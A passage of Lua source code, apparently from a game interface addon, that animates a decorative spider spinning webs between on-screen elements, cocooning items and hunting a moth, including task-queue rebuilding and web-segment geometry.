    local crawlSpeed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX)

    if task.isCross then
      crawlSpeed = crawlSpeed * (C.CROSS_SPEED_MULT or 1)
    end

    if task.isMain then
      crawlSpeed = crawlSpeed * (C.MAIN_SPEED_MULT or 1)
    end

    if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
      crawlSpeed = crawlSpeed * C.FAST_MODE
    end

    if self:IsEmptyMovementTask(task) then
      crawlSpeed = crawlSpeed * (C.EMPTY_SPEED_MULT or 4)
    end

    if crawlSpeed <= 0 then
      crawlSpeed = 1
    end

    S.moveDur = crawlLen / crawlSpeed

    if S.moveDur < 0.05 then
      S.moveDur = 0.05
    end

    S.moveT = 0
    S.lastTaskT = 0
    self:PutSpider(task.p0.x, task.p0.y)
  end
end

function NSPauk:NP_GetCrossSegSortAngle(seg)
    if not seg then
        return 0
    end

    if type(self.NP_LocalAngleAtHub) ~= "function" then
        return 0
    end

    local inst = self:GetOwnerInstance(seg)

    if not inst
        and seg.connA
        and seg.connA.thread
        and seg.connA.thread.ownerRef then
        inst = seg.connA.thread.ownerRef.inst
    end

    if not inst
        and seg.connB
        and seg.connB.thread
        and seg.connB.thread.ownerRef then
        inst = seg.connB.thread.ownerRef.inst
    end

    if not inst then
        return 0
    end

    local connA = seg.connA
    local connB = seg.connB

    if not connA or not connB then
        return 0
    end

    local aAng = self:NP_LocalAngleAtHub(inst, connA)
    local bAng = self:NP_LocalAngleAtHub(inst, connB)

    local twoPi = math.pi * 2

    local delta = bAng - aAng

    while delta < 0 do
        delta = delta + twoPi
    end

    while delta >= twoPi do
        delta = delta - twoPi
    end

    local mid

    if delta > math.pi then
        mid = aAng - ((twoPi - delta) / 2)
    else
        mid = aAng + (delta / 2)
    end

    while mid < 0 do
        mid = mid + twoPi
    end

    while mid >= twoPi do
        mid = mid - twoPi
    end

    return mid
end

function NSPauk:NP_AreRingMainsDrawn(inst)
    if not inst or not inst.conns then
        return false
    end

    local anyAlive = false

    for _, conn in ipairs(inst.conns) do
        if conn.alive then
            anyAlive = true

            if not self:NP_IsWebOwnerDrawn(conn) then
                return false
            end
        end
    end

    return anyAlive
end

function NSPauk:NP_FindRingPriorityReplacement(inst, oldSeg)
    if not inst or not oldSeg then
        return nil
    end

    local C = self.C or {}

    local spacing = tonumber(C.CROSS_ROW_SPACING) or 20
    if spacing < 0.5 then
        spacing = 0.5
    end

    local key = oldSeg.planSectorKey
    local arc = tonumber(oldSeg.planArcLen) or 0

    local best = nil
    local bestDiff = spacing * 0.6

    for _, seg in ipairs(inst.crossSegs or {}) do
        if seg.alive
            and not seg.isInterCross
            and not self:NP_IsWebOwnerDrawn(seg)
            and seg.planSectorKey == key then

            local segArc = tonumber(seg.planArcLen) or 0
            local diff = math.abs(segArc - arc)

            if diff < bestDiff then
                bestDiff = diff
                best = seg
            end
        end
    end

    return best
end

function NSPauk:NP_NormalizeRingCrossSegs(inst)
    if not inst or not inst.isNaturalRing or inst.torn then
        return false
    end

    local C = self.C or {}

    local spacing = tonumber(C.CROSS_ROW_SPACING) or 20
    if spacing < 0.5 then
        spacing = 0.5
    end

    local minCross = tonumber(C.MIN_CROSS_LEN) or 4
    if minCross < 0 then
        minCross = 4
    end

    local sectors = self:NP_GetValidTriangleSectors(inst)
    inst.webSectors = sectors

    local needed = {}
    local changed = false

    local function ensureLen(conn)
        if conn
            and conn.thread
            and (not conn.arcLength or conn.arcLength <= 0) then

            local samples, total = self:BuildArcSamples(conn.thread)
            conn.arcSamples = samples
            conn.arcLength = total
        end
    end

    local function segArcOf(seg, connA)
        if type(seg.planArcLen) == "number"
            and seg.planArcLen == seg.planArcLen
            and seg.planArcLen > 0 then
            return seg.planArcLen
        end

        if type(seg.recheckArcLen) == "number"
            and seg.recheckArcLen == seg.recheckArcLen
            and seg.recheckArcLen > 0 then
            return seg.recheckArcLen
        end

        local p = nil

        if seg.connA == connA then
            p = seg.thread.p0
        elseif seg.connB == connA then
            p = seg.thread.p2
        end

        if p and connA.thread then
            local t, d = self:NP_NearestThreadT(connA.thread, p.x, p.y)

            if type(d) == "number" and d <= 12 then
                return t * (connA.arcLength or 0)
            end
        end

        return nil
    end

    local function findBest(connA, connB, arcLen)
        local candidates = {}
        local maxDiff = spacing * 0.6

        for _, seg in ipairs(inst.crossSegs or {}) do
            if seg.thread and not seg.isInterCross then
                local direct = seg.connA == connA and seg.connB == connB
                local reverse = seg.connA == connB and seg.connB == connA

                if direct or reverse then
                    local segArc = segArcOf(seg, connA)

                    if type(segArc) == "number"
                        and segArc == segArc
                        and segArc > 0 then

                        local diff = math.abs(segArc - arcLen)

                        if diff <= maxDiff then
                            candidates[#candidates + 1] = {
                                seg = seg,
                                diff = diff,
                            }
                        end
                    end
                end
            end
        end

        if #candidates == 0 then
            return nil, {}
        end

        table.sort(candidates, function(a, b)
            if a.diff ~= b.diff then
                return a.diff < b.diff
            end

            local aa = a.seg.alive and 1 or 0
            local bb = b.seg.alive and 1 or 0

            if aa ~= bb then
                return aa > bb
            end

            local da = self:NP_IsWebOwnerDrawn(a.seg) and 1 or 0
            local db = self:NP_IsWebOwnerDrawn(b.seg) and 1 or 0

            if da ~= db then
                return da > db
            end

            return false
        end)

        local best = candidates[1].seg
        local extras = {}

        for i = 2, #candidates do
            extras[#extras + 1] = candidates[i].seg
        end

        return best, extras
    end

    local function quietKill(seg)
        if seg.alive then
            seg.alive = false

            if seg.textures and #seg.textures > 0 then
                self:StartLocalFade(seg.textures, self.C.TEAR_FADE_DURATION)
                seg.textures = {}
            end

            changed = true
        end
    end

    for _, sector in ipairs(sectors) do
        local connA = inst.conns[sector.a]
        local connB = inst.conns[sector.b]

        if connA
            and connB
            and connA.alive
            and connB.alive then

            ensureLen(connA)
            ensureLen(connB)

            local rowArcs = self:NP_GetSectorRowArcs(connA, connB)

            for _, arcLen in ipairs(rowArcs) do
                if type(arcLen) == "number"
                    and arcLen == arcLen
                    and arcLen >= minCross then

                    local targetA = math.min(arcLen, connA.arcLength or 0)
                    local targetB = math.min(arcLen, connB.arcLength or 0)

                    if targetA > 0 and targetB > 0 then
                        local best, extras = findBest(connA, connB, arcLen)

                        for _, extra in ipairs(extras) do
                            if not self:NP_IsWebOwnerDrawn(extra) then
                                quietKill(extra)
                            end
                        end

                        local seg = best

                        if seg and not seg.alive then
                            seg.alive = true
                            seg._nspRingRestored = true
                            changed = true
                        end

                        if not seg then
                            local tA = self:ThreadTAtLength(connA, targetA)
                            local tB = self:ThreadTAtLength(connB, targetB)

                            if tA and tB then
                                seg = self:CreateCrossSegArc(
                                    inst,
                                    connA,
                                    connB,
                                    tA,
                                    tB,
                                    minCross
                                )

                                if seg then
                                    changed = true
                                end
                            end
                        end

                        if seg then
                            seg.planSectorKey = sector.key
                            seg.planArcLen = arcLen
                            needed[seg] = true
                        end
                    end
                end
            end
        end
    end

    for _, seg in ipairs(inst.crossSegs or {}) do
        if not seg.isInterCross
            and seg.alive
            and not needed[seg]
            and not self:NP_IsWebOwnerDrawn(seg) then
            quietKill(seg)
        end
    end

    return changed
end

function NSPauk:NP_RequestRingQueueRebuild(inst, prioritySeg)
    local S = self.S

    if not inst or not inst.isNaturalRing or inst.torn then
        return
    end

    inst.nspRingCrossQueueDirty = true
    S.nspRingQueueRebuildPending = true

    if prioritySeg then
        S.nspRingQueuePriority = prioritySeg
    end
end

function NSPauk:NP_RebuildRingCrossQueue(inst, prioritySeg)
    local S = self.S

    if not inst or not inst.isNaturalRing or inst.torn then
        return false
    end

    if S.nspDrag then
        return false
    end

    if S.phase ~= "task" and S.phase ~= "instanceComplete" then
        return false
    end

    if not self:NP_AreRingMainsDrawn(inst) then
        return false
    end

    self:NP_NormalizeRingCrossSegs(inst)

    local priority = prioritySeg

    if priority
        and (not priority.alive or self:NP_IsWebOwnerDrawn(priority)) then
        priority = self:NP_FindRingPriorityReplacement(inst, priority)
    end

    local tasks = self:NP_RebuildInstanceTasks(inst, priority)

    if type(tasks) == "table" then
        if #tasks > 0 then
            S.tasks = tasks
            S.taskIdx = 1
            S.currentTask = nil
            S.completeTimer = 0
            S.moveT = 0
            S.lastTaskT = 0
            S.phase = "task"

            self:AdvanceTask()
        else
            S.tasks = tasks
            S.taskIdx = 1
            S.currentTask = nil
            S.phase = "instanceComplete"
            S.completeTimer = 0
        end

        inst.nspRingCrossQueueDirty = false

        return true
    end

    return false
end

function NSPauk:NP_BuildRingSectorTasks(inst, tasks, cursorPoint)
    local C = self.C

    if not inst or not tasks then
        return cursorPoint
    end

    local minCross = tonumber(C.MIN_CROSS_LEN) or 4
    if minCross < 0 then
        minCross = 4
    end

    local sectors = self:NP_GetValidTriangleSectors(inst)
    inst.webSectors = sectors

    local cursor = cursorPoint
    local planned = {}

    local twoPi = math.pi * 2

    local function sectorAngle(sector)
        local connA = inst.conns[sector.a]
        local connB = inst.conns[sector.b]

        if not connA or not connB then
            return 0
        end

        if type(self.NP_LocalAngleAtHub) ~= "function" then
            return 0
        end

        local aAng = self:NP_LocalAngleAtHub(inst, connA)
        local bAng = self:NP_LocalAngleAtHub(inst, connB)

        local delta = bAng - aAng

        while delta < 0 do
            delta = delta + twoPi
        end

        while delta >= twoPi do
            delta = delta - twoPi
        end

        local mid

        if delta > math.pi then
            mid = aAng - ((twoPi - delta) / 2)
        else
            mid = aAng + (delta / 2)
        end

        while mid < 0 do
            mid = mid + twoPi
        end

        while mid >= twoPi do
            mid = mid - twoPi
        end

        return mid
    end

    for _, sector in ipairs(sectors) do
        local connA = inst.conns[sector.a]
        local connB = inst.conns[sector.b]

        if connA
            and connB
            and connA.alive
            and connB.alive then

            local rowArcs = self:NP_GetSectorRowArcs(connA, connB)

            if #rowArcs > 0 then
                local angle = sectorAngle(sector)

                for _, arcLen in ipairs(rowArcs) do
                    planned[#planned + 1] = {
                        sector = sector,
                        connA = connA,
                        connB = connB,
                        arcLen = arcLen,
                        angle = angle,
                    }
                end
            end
        end
    end

    table.sort(planned, function(a, b)
        if a.arcLen ~= b.arcLen then
            return a.arcLen < b.arcLen
        end

        if a.angle ~= b.angle then
            return a.angle < b.angle
        end

        return (a.sector.key or "") < (b.sector.key or "")
    end)

    for _, p in ipairs(planned) do
        local arcLen = p.arcLen

        if type(arcLen) == "number"
            and arcLen == arcLen
            and arcLen >= minCross then

            local connA = p.connA
            local connB = p.connB

            local targetA = math.min(arcLen, connA.arcLength or 0)
            local targetB = math.min(arcLen, connB.arcLength or 0)

            if targetA > 0 and targetB > 0 then
                local tA = self:ThreadTAtLength(connA, targetA)
                local tB = self:ThreadTAtLength(connB, targetB)

                if tA and tB then
                    local seg = self:CreateCrossSegArc(
                        inst,
                        connA,
                        connB,
                        tA,
                        tB,
                        minCross
                    )

                    if seg then
                        seg.planSectorKey = p.sector.key
                        seg.planArcLen = arcLen

                        local drawThread =
                            self:NP_OrientThreadForCursor(seg.thread, cursor)
                            or seg.thread

                        if cursor then
                            self:AddTravelPointTask(
                                tasks,
                                cursor,
                                drawThread.p0,
                                connA,
                                seg
                            )
                        end

                        local task = self:AddThreadTask(tasks, seg, drawThread)

                        if task then
                            cursor = {
                                x = drawThread.p2.x,
                                y = drawThread.p2.y,
                            }
                        end
                    end
                end
            end
        end
    end

    return cursor
end

function NSPauk:AddInstance(inst)
    local S = self.S
    local C = self.C

    for _, old in ipairs(S.instances) do
        if old
            and old ~= inst
            and not old.torn
            and not old.isCocoon
            and not old.isMoth then
            self:SettleInstance(old)
        end
    end

    S.instances[#S.instances + 1] = inst

    local maxInstances = tonumber(C.MAX_INSTANCES) or 6

    if maxInstances < 1 then
        maxInstances = 1
    end

    if #S.instances > maxInstances then
        local old = table.remove(S.instances, 1)

        if S.cocoon and S.cocoon.inst == old then
            self:AbortCocoon()
        end

        self:TearInstance(old)
    end
end

function NSPauk:StartNewInstance(preferredHub)
    local S = self.S
    local C = self.C

    if S.limitReached then
        return
    end

    local prev = S.currentInstance

    if prev
        and not prev.torn
        and not prev.isCocoon
        and not prev.isMoth then
        if self:NP_HasRequiredWebPending(prev) then
            self:NP_RequestQueueResume(prev, nil)
            self:NP_ProcessQueueResume()

            if self:NP_HasRequiredWebPending(prev) then
                return
            end
        end
    end

    S.SW, S.SH = self:GetScreenSize()

    local items = self:CollectVisibleItems()

    if math.random() < C.COCOON_CHANCE then
        local victim = self:PickCocoonVictim(items)

        if victim then
            self:StartCocoon(victim)
            return
        end
    end

    local targetCount = self:RandomInt(
        C.TARGET_COUNT_MIN,
        C.TARGET_COUNT_MAX
    )

    if math.random(1, 3) == 3 then
        local ringInst = self:CreateRingInstance(targetCount, items)

        if ringInst then
            self:AddInstance(ringInst)

            S.currentInstance = ringInst
            S.tasks = ringInst.tasks
            S.taskIdx = 1
            S.currentTask = nil
            S.completeTimer = 0

            self:MkSpider()
            self:MkClickBtn()
            self:AdvanceTask()

            return
        end
    end

    local hub = self:PickWebHub(items)

    if hub and hub.frame and not self:ValidateAnchorRect(hub) then
        hub = nil
    end

    local candidates = {}

    if hub then
        candidates = self:CollectTargetCandidates(hub, items)
    end

    if not hub or #candidates == 0 then
        hub, candidates, targetCount = self:FallbackHubAndTargets()
    end

    local inst = self:CreateInstance(hub, candidates, targetCount)

    if not inst or #inst.conns == 0 then
        hub, candidates, targetCount = self:FallbackHubAndTargets()
        inst = self:CreateInstance(hub, candidates, targetCount)
    end

    if not inst or #inst.conns == 0 then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    self:AddInstance(inst)

    S.currentInstance = inst
    S.tasks = inst.tasks
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    self:MkSpider()
    self:MkClickBtn()

    self:AdvanceTask()
end

function NSPauk:Interrupt()

    self:NP_FlushSessionBurst()

    self:ClearAllVisuals()

    local S = self.S

    S.phase = "watch"
    S.stillTimer = 0
    S.speedTimer = 0
end

function NSPauk:CallMoth(method)
    if type(NSPauk_Moth) == "table" and type(NSPauk_Moth[method]) == "function" then
        if type(pcall) == "function" then
            pcall(NSPauk_Moth[method], NSPauk_Moth)
        else
            NSPauk_Moth[method](NSPauk_Moth)
        end
    end
end

function NSPauk:GetMothStuckInfo()
    if type(NSPauk_Moth) ~= "table" then
        return nil
    end

    local info = NSPauk_Moth.stuckInfo

    if type(info) ~= "table" then
        return nil
    end

    if type(info.x) ~= "number" or type(info.y) ~= "number" then
        return nil
    end

    if type(info.thread) ~= "table" or not info.thread.p0 or not info.thread.p2 then
        return nil
    end

    if info.owner and info.owner.alive == false then
        return nil
    end

    local inst = info.thread.ownerRef and info.thread.ownerRef.inst

    if inst and inst.torn then
        return nil
    end

    return info
end

function NSPauk:CanHuntMoth()
    local S = self.S

    if S.moth and S.moth.active then
        return false
    end

    if type(NSPauk_Moth) ~= "table" then
        return false
    end

    if type(NSPauk_Moth.Freeze) ~= "function" then
        return false
    end

    if type(NSPauk_Moth.Destroy) ~= "function" then
        return false
    end

    local info = self:GetMothStuckInfo()

    if not info then
        return false
    end

    if S.phase ~= "watch"
        and S.phase ~= "task"
        and S.phase ~= "instanceComplete" then
        return false
    end

    if S.limitReached or S.limitReturnPending or S.limitCocoonPending then
        return false
    end

    if S.cocoon then
        return false
    end

    if S.currentInstance and S.currentInstance.isMoth then
        return false
    end

    return true
end

function NSPauk:CheckMothHunt(dt)
    local S = self.S

    if self:IsMoving() then
        return
    end

    if S.moth
        and S.moth.active
        and not S.moth.frozen
        and not S.moth.pouncing then
        if self:NP_TryMothPounce() then
            return
        end
    end

    S.mothCheckTimer = (S.mothCheckTimer or 0) + dt

    if S.mothCheckTimer < 0.5 then
        return
    end

    S.mothCheckTimer = 0

    if self:CanHuntMoth() then
        self:StartMothHunt()
    end
end

function NSPauk:CreateMothCocoonInstance(item, info)
    local inst = {
        id = self.nextInstanceId,
        isCocoon = true,
        isMoth = true,
        hub = {
            frame = nil,
            name = item.name,
            rect = self:CopyRect(item),
        },
        conns = {},
        crossSegs = {},
        interSegs = {},
        crossRowsList = {},
        tasks = {},
        crossRows = 0,
        anchorCandidates = { self:CopyRect(item) },
        drawnPoints = 0,
        settled = false,
        mothInfo = info,
    }

    self.nextInstanceId = self.nextInstanceId + 1

    local cx = item.cx
    local cy = item.cy

    local a0 = 16
    local b0 = 16

    local wraps = 3
    local segs = 8

    local prevEnd = nil

    for w = 1, wraps do
        local grow = 0.65 + 0.35 * (w / wraps)

        local a = a0 * grow + (math.random() - 0.5) * 4
        local b = b0 * grow + (math.random() - 0.5) * 4

        if a < 8 then
            a = 8
        end

        if b < 8 then
            b = 8
        end

        local startAng = math.random() * 2 * math.pi
        local dir = (math.random() < 0.5) and 1 or -1

        for s = 1, segs do
            local ang0 = startAng + dir * (s - 1) * (2 * math.pi / segs)
            local ang1 = startAng + dir * s * (2 * math.pi / segs)

            local x0, y0 = self:EllipsePoint(cx, cy, a, b, ang0)
            local x1, y1 = self:EllipsePoint(cx, cy, a, b, ang1)

            x0 = x0 + (math.random() - 0.5) * 3
            y0 = y0 + (math.random() - 0.5) * 3
            x1 = x1 + (math.random() - 0.5) * 3
            y1 = y1 + (math.random() - 0.5) * 3

            local midX = (x0 + x1) / 2
            local midY = (y0 + y1) / 2

            local pushX = midX - cx
            local pushY = midY - cy

            local pl = math.sqrt(pushX * pushX + pushY * pushY)

            if pl < 1 then
                pushX, pushY, pl = 0, 1, 1
            end

            local push = pl * (0.18 + math.random() * 0.18)

            local thread = {
                p0 = { x = x0, y = y0 },
                p1 = {
                    x = midX + (pushX / pl) * push,
                    y = midY + (pushY / pl) * push,
                },
                p2 = { x = x1, y = y1 },
            }

            local conn = self:AddCocoonConn(inst, item, thread)

            if prevEnd then
                self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
            end

            self:AddThreadTask(inst.tasks, conn, thread)

            prevEnd = { x = thread.p2.x, y = thread.p2.y }
        end
    end

    local diags = 2

    for _ = 1, diags do
        local angA = math.random() * 2 * math.pi
        local angB = angA + math.pi + (math.random() - 0.5) * 1.0

        local x0, y0 = self:EllipsePoint(cx, cy, a0 * 1.10, b0 * 1.10, angA)
        local x1, y1 = self:EllipsePoint(cx, cy, a0 * 1.10, b0 * 1.10, angB)

        local thread = {
            p0 = { x = x0, y = y0 },
            p2 = { x = x1, y = y1 },
        }

        self:MakeSag(thread, "main")

        local conn = self:AddCocoonConn(inst, item, thread)

        if prevEnd then
            self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
        end

        self:AddThreadTask(inst.tasks, conn, thread)

        prevEnd = { x = thread.p2.x, y = thread.p2.y }
    end

    if #inst.conns == 0 then
        return nil
    end

    return inst
end

function NSPauk:AddMothInstance(inst)
    local S = self.S
    local C = self.C

    S.instances[#S.instances + 1] = inst

    local maxInstances = tonumber(C.MAX_INSTANCES) or 6

    if #S.instances > maxInstances then
        for i = 1, #S.instances do
            local old = S.instances[i]

            local protected = false

            if old == inst then
                protected = true
            end

            if old and old.isMoth then
                protected = true
            end

            if not protected
                and S.moth
                and S.moth.saved
                and type(S.moth.saved.instances) == "table" then
                for _, savedInst in ipairs(S.moth.saved.instances) do
                    if old == savedInst then
                        protected = true
                        break
                    end
                end
            end

            if not protected then
                table.remove(S.instances, i)

                if S.cocoon and S.cocoon.inst == old then
                    self:AbortCocoon()
                end

                self:TearInstance(old)

                break
            end
        end
    end
end

function NSPauk:NP_MakeMothFreezeTask(point)
    local p = {
        x = point.x or 0,
        y = point.y or 0,
    }

    return {
        kind = "travel",
        nspMothFreeze = true,
        nspNoSupportCheck = true,
        nspNoInsert = true,
        drop = false,
        p0 = { x = p.x, y = p.y },
        p1 = { x = p.x, y = p.y },
        p2 = { x = p.x, y = p.y },
    }
end

function NSPauk:StartMothHunt()
    local S = self.S

    if S.moth and S.moth.active then
        return
    end

    if not self:CanHuntMoth() then
        return
    end

    local info = self:GetMothStuckInfo()
    if not info then
        return
    end

    local x = info.x
    local y = info.y

    local saved = self:SaveMothState()

    if S.nspDrag and S.nspDrag.owner then
        S.nspDrag.owner._nspMothInterrupted = true
    end
    self:NP_ClearGlobalDrag(false)

    if S.currentTask and S.currentTask.nspDragTextures then
        self:RecycleTextures(S.currentTask.nspDragTextures)
        S.currentTask.nspDragTextures = nil
    end

    local item = {
        name = "Moth",
        frame = nil,
        left = x - 16,
        right = x + 16,
        bottom = y - 16,
        top = y + 16,
        width = 32,
        height = 32,
        cx = x,
        cy = y,
    }

    local inst = self:CreateMothCocoonInstance(item, info)

    if not inst then
        S.moth = nil
        self:RestoreMothStateImmediate(saved)
        return
    end

    local wrapTasks = {}
    for _, wrapTask in ipairs(inst.tasks) do
        wrapTasks[#wrapTasks + 1] = wrapTask
    end

    S.moth = {
        active = true,
        phase = "approach",
        x = x,
        y = y,
        info = info,
        inst = inst,
        saved = saved,
        frozen = false,
        pouncing = false,
        pounceThreshold = tonumber(self.C.MOTH_POUNCE_DIST) or 300,
        wrapTasks = wrapTasks,
        timer = 0,
        duration = 180,
        endTime = 0,
    }

    self:AddMothInstance(inst)

    local startX = x
    local startY = y

    if S.spider and S.spider:IsShown() then
        startX = S.lastSpiderX or x
        startY = S.lastSpiderY or y
    end

    local approach = self:NP_MakePlanTask(
        "travel",
        { x = startX, y = startY },
        { x = x, y = y },
        nil,
        nil
    )

    local freeze = self:NP_MakeMothFreezeTask({ x = x, y = y })

    local tasks = {
        approach,
        freeze,
    }

    for _, wrapTask in ipairs(wrapTasks) do
        tasks[#tasks + 1] = wrapTask
    end

    inst.tasks = tasks

    S.currentInstance = inst
    S.tasks = tasks
    S.taskIdx = 1
    S.currentTask = nil
    S.cocoon = nil
    S.completeTimer = 0
    S.phase = "task"

    self:MkSpider()
    self:MkClickBtn()

    if not self:NP_TryMothPounce() then
        self:AdvanceTask()
    end
end

function NSPauk:BeginMothEat()
    local S = self.S

    if not S.moth or not S.moth.active then
        return
    end

    if S.phase == "mothEat" then
        return
    end

    self:CallMoth("Freeze")

    S.moth.frozen = true
    S.moth.phase = "eat"
    S.moth.duration = 180
    S.moth.endTime = GetTime() + 180
    S.moth.timer = 0

    S.phase = "mothEat"
    S.speedTimer = 0
    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
end

function NSPauk:UpdateMothEat(dt)
    local S = self.S
    local C = self.C

    local m = S.moth

    if not m or not m.active then
        return
    end

    S.speedTimer = S.speedTimer + dt

    if S.speedTimer >= C.SPEED_CHECK then
        S.speedTimer = 0

        if self:IsMoving() then
            self:Interrupt()

            return
        end
    end

    m.timer = m.timer + dt

    local duration = m.duration or 180

    local progress = m.timer / duration

    if progress > 1 then
        progress = 1
    end

    if m.inst then
        self:SetInstanceWebAlpha(m.inst, (C.WEB_ALPHA or 0.55) * (1 - progress))
    end

    if m.x and m.y then
        self:PutSpider(m.x, m.y)
    end

    if progress >= 1 then
        self:FinishMothEat()
    end
end

function NSPauk:SaveMothState()
    local S = self.S

    local instances = {}

    for i, inst in ipairs(S.instances) do
        instances[i] = inst
    end

    return {
        phase = S.phase,
        currentInstance = S.currentInstance,
        tasks = S.tasks,
        taskIdx = S.taskIdx,
        cocoon = S.cocoon,
        completeTimer = S.completeTimer,
        moveDur = S.moveDur,
        moveT = S.moveT,
        lastTaskT = S.lastTaskT,
        stillTimer = S.stillTimer,
        limitReached = S.limitReached,
        limitReturnPending = S.limitReturnPending,
        limitCocoonPending = S.limitCocoonPending,
        limitWaitTimer = S.limitWaitTimer,
        limitHomePoint = S.limitHomePoint,
        spiderX = S.lastSpiderX or 0,
        spiderY = S.lastSpiderY or 0,
        instances = instances,
    }
end

function NSPauk:NP_HasRequiredWebPending(inst)
    if not inst or inst.torn or inst.isCocoon or inst.isMoth then
        return false
    end

    local hasAliveMain = false

    for _, conn in ipairs(inst.conns or {}) do
        if conn.alive and not conn.isDiameter then
            hasAliveMain = true

            if not self:NP_IsWebOwnerDrawn(conn) then
                return true
            end
        end
    end

    if not hasAliveMain then
        return false
    end

    for _, seg in ipairs(inst.crossSegs or {}) do
        if seg.alive then
            local depsAlive = true

            if seg.connA and not seg.connA.alive then
                depsAlive = false
            end

            if seg.connB and not seg.connB.alive then
                depsAlive = false
            end

            if depsAlive and not self:NP_IsWebOwnerDrawn(seg) then
                return true
            end
        end
    end

    local sectors = nil

    if type(inst.webSectors) == "table" then
        sectors = inst.webSectors
    elseif type(self.NP_GetValidTriangleSectors) == "function" then
        sectors = self:NP_GetValidTriangleSectors(inst)
    end

    if type(sectors) ~= "table" or #sectors == 0 then
        return false
    end

    local spacing = tonumber(self.C.CROSS_ROW_SPACING) or 20
    if spacing < 0.5 then
        spacing = 0.5
    end

    for _, sector in ipairs(sectors) do
        local connA = inst.conns and inst.conns[sector.a]
        local connB = inst.conns and inst.conns[sector.b]

        if connA
            and connB
            and connA.alive
            and connB.alive then

            if connA.thread
                and (not connA.arcLength or connA.arcLength <= 0) then
                local samples, total = self:BuildArcSamples(connA.thread)
                connA.arcSamples = samples
                connA.arcLength = total
            end

            if connB.thread
                and (not connB.arcLength or connB.arcLength <= 0) then
                local samples, total = self:BuildArcSamples(connB.thread)
                connB.arcSamples = samples
                connB.arcLength = total
            end

            local rowArcs = self:NP_GetSectorRowArcs(connA, connB)

            if #rowArcs > 0 then
                local pairSegs = {}

                for _, seg in ipairs(inst.crossSegs or {}) do
                    if seg.alive then
                        local direct = seg.connA == connA
                            and seg.connB == connB

                        local reverse = seg.connA == connB
                            and seg.connB == connA

                        if direct or reverse then
                            pairSegs[#pairSegs + 1] = seg
                        end
                    end
                end

                local function findSegForArc(arcLen)
                    local best = nil
                    local bestDiff = spacing * 0.6

                    for _, seg in ipairs(pairSegs) do
                        local segArc = nil

                        if type(seg.recheckArcLen) == "number"
                            and seg.recheckArcLen == seg.recheckArcLen
                            and seg.recheckArcLen > 0 then
                            segArc = seg.recheckArcLen
                        elseif type(seg.planArcLen) == "number"
                            and seg.planArcLen == seg.planArcLen
                            and seg.planArcLen > 0 then
                            segArc = seg.planArcLen
                        end

                        if type(segArc) == "number"
                            and segArc == segArc
                            and segArc > 0 then

                            local diff = math.abs(segArc - arcLen)

                            if diff < bestDiff then
                                bestDiff = diff
                                best = seg
                            end
                        end
                    end

                    return best
                end

                for _, arcLen in ipairs(rowArcs) do
                    local seg = findSegForArc(arcLen)

                    if not seg then
                        return true
                    end

                    if not self:NP_IsWebOwnerDrawn(seg) then
                        return true
                    end
                end
            end
        end
    end

    return false
end

function NSPauk:NP_RequestQueueResume(inst, priorityOwner)
    local S = self.S

    if type(S) ~= "table" then
        return
    end

    if not inst or inst.torn or inst.isCocoon or inst.isMoth then
        return
    end

    if inst ~= S.currentInstance then
        return
    end

    S.nspQueueResumePending = true
    S.nspQueueResumeInst = inst

    if priorityOwner then
        S.nspQueueResumePriority = priorityOwner
    end
end

function NSPauk:NP_ProcessQueueResume()
    local S = self.S

    if type(S) ~= "table" then
        return false
    end

    if S.nspQueueRebuildRunning then
        local now = GetTime()

        if type(S.nspQueueRebuildLockAt) == "number"
            and S.nspQueueRebuildLockAt == S.nspQueueRebuildLockAt
            and (now - S.nspQueueRebuildLockAt) > 3 then
            S.nspQueueRebuildRunning = false
        else
            return false
        end
    end

    if not S.nspQueueResumePending then
        return false
    end

    local inst = S.nspQueueResumeInst or S.currentInstance
    local priority = S.nspQueueResumePriority

    if not inst
        or inst.torn
        or inst.isCocoon
        or inst.isMoth
        or inst ~= S.currentInstance then
        S.nspQueueResumePending = false
        S.nspQueueResumeInst = nil
        S.nspQueueResumePriority = nil
        return false
    end

    if S.phase ~= "task" and S.phase ~= "instanceComplete" then
        return false
    end

    if S.limitReached or S.limitReturnPending or S.limitCocoonPending then
        return false
    end

    if S.moth and S.moth.active then
        return false
    end

    if S.combatHide then
        return false
    end

    if S.nspDrag then
        local activeDragTask = S.currentTask and S.currentTask.nspDuringDrag

        if activeDragTask then
            return false
        end

        self:NP_ClearGlobalDrag(true)
    end

    S.nspQueueResumePending = false
    S.nspQueueResumeInst = nil
    S.nspQueueResumePriority = nil

    if not self:NP_HasRequiredWebPending(inst) then
        return false
    end

    S.nspQueueRebuildRunning = true
    S.nspQueueRebuildLockAt = GetTime()

    self:NP_RecheckWebSectors(inst)
    self:NP_RecheckWebSectorsByTriangles(inst)

    if S.nspDrag then
        local activeDragTask = S.currentTask and S.currentTask.nspDuringDrag

        if not activeDragTask then
            self:NP_ClearGlobalDrag(false)
        end
    end

    if inst.torn
        or (S.phase ~= "task" and S.phase ~= "instanceComplete") then
        S.nspQueueRebuildRunning = false
        return false
    end

    if priority
        and not priority.alive
        and priority.connA
        and priority.connB
        and priority.connA.alive
        and priority.connB.alive then
        priority.alive = true
        priority._nspQueueRevive = true
    end

    local tasks = self:NP_RebuildInstanceTasks(inst, priority)

    if type(tasks) == "table"
        and #tasks > 0
        and not inst.torn then
        S.tasks = tasks
        S.taskIdx = 1
        S.currentTask = nil
        S.completeTimer = 0
        S.moveT = 0
        S.lastTaskT = 0
        S.phase = "task"
        S.nspQueueRebuildRunning = false
        self:AdvanceTask()
        return true
    end

    S.nspQueueRebuildRunning = false

    return false
end

function NSPauk:NP_RebuildInstanceTasks(inst, priorityOwner)
    local S = self.S

    if not inst or inst.torn then
        return nil
    end

    if inst.isNaturalRing
        and type(self.NP_NormalizeRingCrossSegs) == "function" then
        self:NP_NormalizeRingCrossSegs(inst)
    end

    local tasks = {}
    local added = {}

    local cursor = nil

    if S.spider and S.spider:IsShown() then
        cursor = {
            x = S.lastSpiderX or 0,
            y = S.lastSpiderY or 0,
        }
    end

    local spacing = tonumber(self.C.CROSS_ROW_SPACING) or 20
    if spacing < 0.5 then
        spacing = 0.5
    end

    local function isDrawn(owner)
        return self:NP_IsWebOwnerDrawn(owner)
    end

